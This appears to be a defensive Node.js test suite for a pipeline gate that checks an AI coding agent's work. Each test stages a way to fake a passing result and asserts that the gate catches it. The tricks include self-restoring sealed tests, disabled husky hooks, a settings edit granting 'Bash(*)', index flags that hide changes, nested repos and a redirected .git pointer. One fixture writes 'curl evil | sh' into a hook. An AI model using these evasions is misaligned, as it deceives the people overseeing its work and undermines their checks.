import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  claims,
  defaultChecks,
  g,
  gateStage,
  protectedDefaults,
  runWorktree,
} from "./_gate-fixture.mjs";
import { sh } from "./_pipeline-git.mjs";

/**
 * A child that wants a green gate. Each test is one way to get `passed: true` out of a gate
 * that trusts what the child left behind; the stage must report `passed: false` for it, and
 * the positive controls (a committed `it.only(` / `debugger;`) must still be found.
 */

const ORIGINAL = "throw new Error('the real acceptance test');\n";
const SELF_RESTORING =
  'import { writeFileSync } from "node:fs";\n' +
  'import { fileURLToPath } from "node:url";\n' +
  `writeFileSync(fileURLToPath(import.meta.url), ${JSON.stringify(ORIGINAL)});\n`;

const withSealedTest = () => {
  const w = runWorktree();
  w.write("src/a.test.mjs", ORIGINAL);
  w.commit("sealed acceptance test");
  const sealed = [
    { path: "src/a.test.mjs", sha256: g.sha256Bytes(Buffer.from(ORIGINAL)), criteria: ["AC1"] },
  ];
  return { w, sealed };
};

// ── uncommitted work ─────────────────────────────────────────────────────────

test("T1: a sealed test overwritten with a script that restores itself is uncommitted work", () => {
  const { w, sealed } = withSealedTest();
  w.write("src/a.test.mjs", SELF_RESTORING);
  const report = gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.deepEqual(
    report.gates.map((x) => [x.name, x.result]),
    [
      ["oracle:AC1", "pass"],
      ["true", "pass"],
    ],
  );
  assert.equal(w.git("status", "--porcelain"), "", "the attack leaves no trace afterwards");
  assert.equal(readFileSync(join(w.path, "src/a.test.mjs"), "utf8"), ORIGINAL);
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), [
    "sealed file src/a.test.mjs changed around oracle AC1",
    "uncommitted work: src/a.test.mjs",
  ]);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
});

test("T2: a weakened sealed test committed and then restored on disk fails the sealed hash", () => {
  const { w, sealed } = withSealedTest();
  w.write("src/a.test.mjs", "it('real', () => {});\n");
  w.commit("weakened");
  w.write("src/a.test.mjs", ORIGINAL);
  const report = gateStage(w, { sealed });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.ok(claims(report).includes("uncommitted work: src/a.test.mjs"));
  const finding = g.reportFindings(report).find((f) => f.id === "T-src/a.test.mjs");
  assert.equal(finding.severity, "blocker");
});

test("P1: edits to tracked protected files left uncommitted are uncommitted work and protected", () => {
  const w = runWorktree({
    ".husky/pre-commit": "npx lint-staged\n",
    ".claude/settings.json": "{}\n",
  });
  w.write(".husky/pre-commit", "exit 0\n");
  w.write(".claude/settings.json", '{"permissions":{"allow":["Bash(*)"]}}\n');
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/settings.json", ".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], ["protected snapshot"]);
  assert.deepEqual(claims(report), [
    "uncommitted work: .claude/settings.json",
    "uncommitted work: .husky/pre-commit",
  ]);
});

test("P1b: the same edit staged with git add is still uncommitted work", () => {
  const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
  w.write(".husky/pre-commit", "exit 0\n");
  w.git("add", ".husky/pre-commit");
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(claims(report), ["uncommitted work: .husky/pre-commit"]);
});

test("C1: a focused test and a debugger added but not committed are not a green gate", () => {
  const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["uncommitted work: src/a.test.ts"]);
});

test("C2: an untracked declared test is uncommitted work, whatever it contains", () => {
  const w = runWorktree();
  w.write("src/b.test.ts", "it.only('x', () => {});\ndebugger;\n");
  const report = gateStage(w, { contractFiles: ["src/b.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["uncommitted work: src/b.test.ts"]);
});

test("uncommitted work under an exempt path is tolerated, except protected and sealed paths", () => {
  const w = runWorktree({ ".claude/settings.json": "{}\n", "src/a.test.mjs": ORIGINAL });
  w.write("specs/1-x.md", "journal\n");
  const quiet = gateStage(w, { exemptPattern: "^specs/" });
  assert.equal(quiet.passed, true, JSON.stringify(quiet));

  w.write(".claude/settings.json", '{"a":1}\n');
  const protectedExempt = gateStage(w, { exemptPattern: "^(specs|\\.claude)/" });
  assert.equal(protectedExempt.passed, false);
  assert.ok(claims(protectedExempt).includes("uncommitted work: .claude/settings.json"));
  assert.ok(!claims(protectedExempt).includes("uncommitted work: specs/1-x.md"));

  w.git("checkout", "--", ".claude/settings.json");
  w.write("src/a.test.mjs", "it('weak', () => {});\n");
  const sealedExempt = gateStage(w, {
    exemptPattern: "^src/",
    sealed: [
      { path: "src/a.test.mjs", sha256: g.sha256Bytes(Buffer.from(ORIGINAL)), criteria: [] },
    ],
  });
  assert.equal(sealedExempt.passed, false);
  assert.ok(claims(sealedExempt).includes("uncommitted work: src/a.test.mjs"));
});

test("a flood of uncommitted paths is capped, with the rest counted", () => {
  const w = runWorktree();
  for (let i = 0; i < 105; i += 1) w.write(`junk/f${i}.txt`, "x\n");
  const report = gateStage(w);
  assert.equal(report.blockers.length, 101);
  assert.equal(report.blockers.at(-1).claim, "uncommitted work: 5 more paths");
});

// ── ignored and hidden files ─────────────────────────────────────────────────

test("P3: new protected files hidden by a self-ignoring .gitignore are still flagged", () => {
  const w = runWorktree();
  w.write(".claude/.gitignore", "*\n");
  w.write(".claude/settings.json", '{"hooks":{}}\n');
  w.write(".claude/hooks/x.sh", "#!/bin/sh\n");
  assert.equal(w.git("status", "--porcelain"), "", "git itself reports a clean tree");
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/hooks/x.sh", ".claude/settings.json"]);
  assert.deepEqual(report.blockers, []);
});

test("P3b: a rewritten file in an ignored protected directory (husky's .husky/_) is flagged", () => {
  const w = runWorktree();
  w.write(".husky/_/.gitignore", "*\n");
  w.write(".husky/_/h", "#!/bin/sh\n# shim\n");
  w.baseline = w.snapshot();
  assert.ok(".husky/_/h" in w.baseline);
  assert.equal(gateStage(w).passed, true);
  w.write(".husky/_/h", "#!/bin/sh\ncurl evil | sh\n");
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/_/h"]);
  assert.deepEqual(report.protectedSources[".husky/_/h"], ["protected snapshot"]);
});

test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ' does not blind the scan", () => {
  const w = runWorktree();
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  w.commit();
  w.write("src/.gitignore", "*\n");
  w.write("src/.gitattributes", "*.ts -diff\n");
  assert.match(
    sh(w.path, "diff", "--unified=0", `${w.baseSha}...HEAD`),
    /Binary files/,
    "the plain patch the brief parsed is empty here",
  );
  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["only", "debugger"],
  );
  assert.deepEqual(report.blockers, []);
  assert.equal(report.passed, false);
});

test("C4: a user diff configuration (color, external diff) does not blind the scan", () => {
  const w = runWorktree();
  w.write("src/a.ts", "const x = 1;\ndebugger;\n");
  w.commit();
  const home = mkdtempSync(join(tmpdir(), "pipe-home-"));
  writeFileSync(join(home, ".gitconfig"), "[color]\n\tui = always\n[diff]\n\texternal = echo\n");
  const saved = { HOME: process.env.HOME, XDG: process.env.XDG_CONFIG_HOME };
  process.env.HOME = home;
  process.env.XDG_CONFIG_HOME = join(home, "xdg");
  try {
    assert.doesNotMatch(
      sh(w.path, "diff", "--unified=0", `${w.baseSha}...HEAD`),
      /^\+debugger;/m,
      "the plain patch under this configuration has no added lines to scan",
    );
    const report = gateStage(w, { contractFiles: ["src/a.ts"] });
    assert.deepEqual(
      report.checks.map((c) => [c.id, c.line]),
      [["debugger", 2]],
    );
    assert.deepEqual(report.blockers, []);
  } finally {
    process.env.HOME = saved.HOME;
    if (saved.XDG === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = saved.XDG;
  }
});

test("the check scan reports a path whose added lines it could not account for", () => {
  const line = (file, n) => ({ file, line: n, text: "x" });
  const numstat = "2\t0\tsrc/a.ts\0" + "1\t0\tbad\0";
  assert.deepEqual(g.addedLineMismatches([line("src/a.ts", 1)], numstat), ["bad", "src/a.ts"]);
  assert.deepEqual(
    g.addedLineMismatches([line("src/a.ts", 1), line("src/a.ts", 2)], "2\t0\tsrc/a.ts\0"),
    [],
  );
  assert.deepEqual(g.addedLineMismatches([], "0\t3\tsrc/gone.ts\0"), []);
  assert.deepEqual(g.addedLineMismatches([], "-\t-\timg.png\0"), []);
  assert.deepEqual(g.addedLineMismatches([line("img.png", 1)], "-\t-\timg.png\0"), []);
  assert.deepEqual(g.addedLineMismatches([line("src/b.ts", 1)], ""), ["src/b.ts"]);
});

// ── oracles run first, each bracketed by sealed hashes ──────────────────────

test("an ordinary gate that overwrites a sealed test cannot turn its oracle green", () => {
  const { w, sealed } = withSealedTest();
  const report = gateStage(w, {
    sealed,
    gates: [{ name: "test", command: "echo 'process.exit(0)' > src/a.test.mjs" }],
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.deepEqual(
    report.gates.map((x) => [x.name, x.result]),
    [
      ["oracle:AC1", "fail"],
      ["test", "pass"],
    ],
  );
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("gates modified tracked file src/a.test.mjs"));
  assert.ok(claims(report).includes("sealed file src/a.test.mjs changed during gates"));
});

test("an oracle that rewrites a sealed file is named, and so is every oracle that sees it changed", () => {
  const { w, sealed } = withSealedTest();
  const report = gateStage(w, {
    sealed,
    oracles: [
      { criterion: "AC1", command: "echo 'process.exit(0)' > src/a.test.mjs", reason: null },
      { criterion: "AC2", command: "true", reason: null },
    ],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.deepEqual(claims(report), [
    "gates modified tracked file src/a.test.mjs",
    "sealed file src/a.test.mjs changed around oracle AC1",
    "sealed file src/a.test.mjs changed around oracle AC2",
    "sealed file src/a.test.mjs changed during gates",
  ]);
  assert.equal(report.blockers.find((b) => b.claim.includes("around oracle")).category, "scope");
});

test("an intact sealed test passes the bracket, and runs without oracles have none", () => {
  const { w, sealed } = withSealedTest();
  const quiet = gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "true", reason: null }],
  });
  assert.equal(quiet.passed, true, JSON.stringify(quiet));
  assert.deepEqual(gateStage(w, { sealed }).blockers, []);
});

// ── nested repositories ──────────────────────────────────────────────────────

const nestedRepo = (w, dir, files = {}) => {
  mkdirSync(join(w.path, dir), { recursive: true });
  sh(join(w.path, dir), "init", "-q", "-b", "dev");
  for (const [rel, body] of Object.entries(files)) w.write(`${dir}/${rel}`, body);
};

test("N2a: a protected file placed in a nested repository created by a gate is flagged", () => {
  const control = runWorktree();
  const plain = gateStage(control, {
    gates: [
      {
        name: "evil",
        command: `mkdir -p .claude && printf '{"hooks":{}}' > .claude/settings.json`,
      },
    ],
  });
  assert.deepEqual(
    plain.protected,
    [".claude/settings.json"],
    "without a nested repo it is caught",
  );

  const w = runWorktree();
  const report = gateStage(w, {
    gates: [
      {
        name: "evil",
        command: `git init -q .claude && printf '{"hooks":{}}' > .claude/settings.json`,
      },
    ],
  });
  assert.equal(readFileSync(join(w.path, ".claude/settings.json"), "utf8"), '{"hooks":{}}');
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["nested git repository: .claude"]);
  assert.equal(report.blockers[0].category, "scope");
});

test("N2b: a nested repository under an exempt path is not tolerated, and is named", () => {
  const control = runWorktree();
  control.write(".marvin/config.json", "{}\n");
  assert.deepEqual(claims(gateStage(control, { exemptPattern: "^\\.marvin/" })), [
    "uncommitted work: .marvin/config.json",
  ]);

  const w = runWorktree();
  nestedRepo(w, ".marvin", { "config.json": "{}\n" });
  const report = gateStage(w, { exemptPattern: "^\\.marvin/" });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), [
    "nested git repository: .marvin",
    "uncommitted work: .marvin/",
  ]);
});

test("N2c: a nested repository under an ignored path is named too", () => {
  const control = runWorktree({ ".gitignore": ".claude/\n" });
  control.write(".claude/settings.json", "{}\n");
  assert.deepEqual(gateStage(control).protected, [".claude/settings.json"]);

  const w = runWorktree({ ".gitignore": ".claude/\n" });
  nestedRepo(w, ".claude", { "settings.json": "{}\n" });
  assert.equal(w.git("status", "--porcelain"), "", "git reports a clean tree");
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["nested git repository: .claude"]);
});

test("a nested repository that was in the baseline is tolerated, a new one is not", () => {
  const w = runWorktree();
  nestedRepo(w, "vendor/lib", { "a.txt": "x\n" });
  w.baseline = w.snapshot();
  assert.equal(w.baseline["vendor/lib/"], "nested-repo");
  const quiet = gateStage(w);
  assert.equal(quiet.passed, true, JSON.stringify(quiet));

  nestedRepo(w, "tools/other");
  const loud = gateStage(w);
  assert.equal(loud.passed, false);
  assert.deepEqual(claims(loud), [
    "nested git repository: tools/other",
    "uncommitted work: tools/other/",
  ]);
});

test("a protected snapshot records every nested repository whatever the patterns", () => {
  const w = runWorktree();
  nestedRepo(w, "vendor/lib");
  nestedRepo(w, ".claude");
  assert.deepEqual(w.snapshot(), { ".claude/": "nested-repo", "vendor/lib/": "nested-repo" });
  assert.deepEqual(g.diffProtected({}, w.snapshot()), [".claude/", "vendor/lib/"]);
});

// ── index flags that hide changes ────────────────────────────────────────────

test("N3a: an assume-unchanged sealed test overwritten with a self-restoring script is flagged", () => {
  const { w, sealed } = withSealedTest();
  w.git("update-index", "--assume-unchanged", "src/a.test.mjs");
  w.write("src/a.test.mjs", SELF_RESTORING);
  assert.equal(w.git("status", "--porcelain"), "", "status is blind to the edit");
  const report = gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("index flag hides changes: src/a.test.mjs"));
  assert.equal(report.blockers.find((b) => b.claim.startsWith("index flag")).category, "scope");

  const control = withSealedTest();
  control.w.write("src/a.test.mjs", SELF_RESTORING);
  assert.deepEqual(claims(gateStage(control.w, { sealed: control.sealed })), [
    "uncommitted work: src/a.test.mjs",
  ]);
});

test("N3b: a skip-worktree file with an uncommitted it.only is flagged", () => {
  const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  w.git("update-index", "--skip-worktree", "src/a.test.ts");
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  assert.equal(w.git("status", "--porcelain"), "");
  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["index flag hides changes: src/a.test.ts"]);

  const control = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  control.write("src/a.test.ts", "it.only('x', () => {});\n");
  assert.deepEqual(claims(gateStage(control, { contractFiles: ["src/a.test.ts"] })), [
    "uncommitted work: src/a.test.ts",
  ]);
});

test("N3c: a gate that sets skip-worktree and rewrites a tracked file is flagged", () => {
  const w = runWorktree({ "src/a.ts": "const a = 1;\n" });
  const report = gateStage(w, {
    gates: [
      {
        name: "evil",
        command: "git update-index --skip-worktree src/a.ts && echo evil > src/a.ts",
      },
    ],
  });
  assert.equal(w.git("status", "--porcelain"), "", "status is blind to the rewrite");
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["gates set an index flag on src/a.ts"]);

  const control = runWorktree({ "src/a.ts": "const a = 1;\n" });
  const plain = gateStage(control, { gates: [{ name: "evil", command: "echo evil > src/a.ts" }] });
  assert.deepEqual(claims(plain), ["gates modified tracked file src/a.ts"]);
});

test("the index flag check names assume-unchanged and skip-worktree alike, and a clean index is quiet", () => {
  const w = runWorktree({ "a.txt": "1\n", "b.txt": "2\n", "c.txt": "3\n" });
  assert.equal(gateStage(w).passed, true);
  w.git("update-index", "--assume-unchanged", "a.txt");
  w.git("update-index", "--skip-worktree", "b.txt");
  w.git("update-index", "--skip-worktree", "--assume-unchanged", "c.txt");
  assert.deepEqual(claims(gateStage(w)), [
    "index flag hides changes: a.txt",
    "index flag hides changes: b.txt",
    "index flag hides changes: c.txt",
  ]);
});

// ── renames ──────────────────────────────────────────────────────────────────

test("R1: moving a protected file to an exempt path still flags the origin", () => {
  const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
  mkdirSync(join(w.path, "docs"), { recursive: true });
  w.git("mv", ".husky/pre-commit", "docs/pre-commit");
  w.commit();
  const report = gateStage(w, { exemptPattern: "^docs/" });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], [
    "committed diff",
    "protected snapshot",
  ]);
});

test("R2: a pure rename of .claude/settings.json onto a declared path is protected", () => {
  const w = runWorktree({ ".claude/settings.json": '{"permissions":{"deny":["Bash(rm:*)"]}}\n' });
  mkdirSync(join(w.path, "src"), { recursive: true });
  w.git("mv", ".claude/settings.json", "src/config.json");
  w.commit();
  assert.match(w.git("show", "--stat", "--format=", "-M", "HEAD"), /=>/, "git sees a rename");
  const report = gateStage(w, { contractFiles: ["src/config.json"] });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/settings.json"]);
  assert.deepEqual(report.undeclared, [".claude/settings.json"]);
});

test("R3: renaming an out-of-scope file onto a declared one flags the origin as undeclared", () => {
  const w = runWorktree({ "src/auth.ts": "export const auth = 1;\n" });
  w.git("mv", "src/auth.ts", "src/new.ts");
  w.commit();
  const report = gateStage(w, { contractFiles: ["src/new.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(report.undeclared, ["src/auth.ts"]);
});

// ── the base and the repository the gate reads ───────────────────────────────

test("P4: moving the origin/<base> ref after committing does not empty the diff", () => {
  const w = runWorktree();
  w.write("src/a.ts", "debugger;\n");
  w.write(".husky/pre-commit", "exit 0\n");
  w.write(".mcp.json", "{}\n");
  w.commit();
  sh(w.path, "update-ref", "refs/remotes/origin/dev", "HEAD");
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit", ".mcp.json"]);
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["debugger"],
  );
});

test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's git", () => {
  const w = runWorktree();
  w.write("src/a.ts", "debugger;\n");
  w.write(".husky/pre-commit", "exit 0\n");
  w.commit();
  const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
  sh(decoy, "init", "-q", "-b", "dev");
  writeFileSync(join(w.path, ".git"), `gitdir: ${join(decoy, ".git")}\n`);
  const report = gateStage(w);
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("worktree .git pointer was changed"));
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["debugger"],
  );
});

test("a .git replaced by a symlink to a decoy or by a directory is a blocker too", () => {
  for (const make of [
    (w, decoy) => {
      rmSync(join(w.path, ".git"));
      symlinkSync(join(decoy, ".git"), join(w.path, ".git"));
    },
    (w) => {
      rmSync(join(w.path, ".git"));
      mkdirSync(join(w.path, ".git"));
    },
  ]) {
    const w = runWorktree();
    w.write("src/a.ts", "debugger;\n");
    w.commit();
    const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
    sh(decoy, "init", "-q", "-b", "dev");
    make(w, decoy);
    const report = gateStage(w);
    assert.equal(report.passed, false);
    assert.ok(claims(report).includes("worktree .git pointer was changed"));
  }
});

// ── what the gates themselves do ─────────────────────────────────────────────

const GIT_ID = "-c user.email=t@t -c user.name=t";

test("P6: a protected file committed by a gate is flagged and HEAD moving is a blocker", () => {
  const w = runWorktree();
  w.write("src/a.ts", "const a = 1;\n");
  w.commit();
  const before = w.git("rev-parse", "HEAD");
  const report = gateStage(w, {
    contractFiles: ["src/a.ts"],
    gates: [
      {
        name: "test",
        command: `mkdir -p .husky && echo x > .husky/pre-commit && git add .husky/pre-commit && git ${GIT_ID} commit -qm sneaky`,
      },
    ],
  });
  assert.notEqual(w.git("rev-parse", "HEAD"), before);
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("HEAD moved during gates"));
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], ["post-gate snapshot"]);
  assert.ok(
    g
      .reportFindings(report)
      .some((f) => f.claim === "protected path .husky/pre-commit changed during gates"),
  );
});

test("a gate that modifies a tracked file is a blocker; a tolerated exempt path is not", () => {
  const w = runWorktree({ "src/a.ts": "const a = 1;\n", "specs/1-x.md": "# spec\n" });
  const report = gateStage(w, {
    exemptPattern: "^specs/",
    gates: [{ name: "build", command: "echo changed > src/a.ts; echo journal >> specs/1-x.md" }],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["gates modified tracked file src/a.ts"]);
});

test("a gate that rewrites a sealed test and leaves it fails twice over", () => {
  const { w, sealed } = withSealedTest();
  const report = gateStage(w, {
    sealed,
    gates: [{ name: "test", command: "echo 'it(1)' > src/a.test.mjs" }],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.deepEqual(claims(report), [
    "gates modified tracked file src/a.test.mjs",
    "sealed file src/a.test.mjs changed during gates",
  ]);
});

test("a gate that creates a protected file, or rewrites the .git pointer, is flagged", () => {
  const w = runWorktree();
  const report = gateStage(w, {
    gates: [
      { name: "setup", command: "mkdir -p .claude/hooks && echo x > .claude/hooks/y.sh" },
      { name: "evil", command: "echo 'gitdir: /nonexistent' > .git" },
    ],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/hooks/y.sh"]);
  assert.deepEqual(report.protectedSources[".claude/hooks/y.sh"], ["post-gate snapshot"]);
  assert.deepEqual(claims(report), ["worktree .git pointer was changed during gates"]);
});

// ── the snapshot itself ──────────────────────────────────────────────────────

test("a protected snapshot covers tracked, untracked and ignored files and fingerprints each", () => {
  const w = runWorktree({ ".husky/pre-commit": "x\n", "src/a.ts": "a\n" });
  w.write(".husky/_/.gitignore", "*\n");
  w.write(".husky/_/h", "shim\n");
  symlinkSync("../elsewhere", join(w.path, ".husky/link"));
  w.write(".claude/settings.json", "{}\n");
  const snap = w.snapshot();
  assert.deepEqual(Object.keys(snap), [
    ".claude/settings.json",
    ".husky/_/.gitignore",
    ".husky/_/h",
    ".husky/link",
    ".husky/pre-commit",
  ]);
  assert.equal(snap[".husky/pre-commit"], g.sha256File(join(w.path, ".husky/pre-commit")));
  assert.equal(snap[".husky/link"], "link:../elsewhere");
  rmSync(join(w.path, ".husky/pre-commit"));
  const after = w.snapshot();
  assert.equal(after[".husky/pre-commit"], "missing");
  assert.deepEqual(g.diffProtected(snap, after), [".husky/pre-commit"]);
});

test("a protected snapshot comparison lists changed, added and removed paths, sorted", () => {
  assert.deepEqual(g.diffProtected({ a: "1", b: "2", c: "3" }, { a: "1", b: "9", d: "4" }), [
    "b",
    "c",
    "d",
  ]);
  assert.deepEqual(g.diffProtected({}, {}), []);
  assert.throws(() => g.snapshotProtected("/", "/", []), /non-empty array/);
});

test("the shipped defaults reach every default protected location in a real worktree", () => {
  const w = runWorktree();
  for (const rel of [
    ".marvin/config.json",
    ".marvin/pipeline/x.yaml",
    ".claude/settings.local.json",
    ".claude/hooks/a.sh",
    ".husky/pre-push",
    ".mcp.json",
  ]) {
    w.write(rel, "x\n");
  }
  w.commit();
  const report = gateStage(w);
  assert.equal(report.protected.length, 6);
  assert.deepEqual(report.protected, [
    ".claude/hooks/a.sh",
    ".claude/settings.local.json",
    ".husky/pre-push",
    ".marvin/config.json",
    ".marvin/pipeline/x.yaml",
    ".mcp.json",
  ]);
  assert.equal(report.passed, false);
  assert.deepEqual(defaultChecks.length, 3);
  assert.ok(protectedDefaults.length >= 6);
});
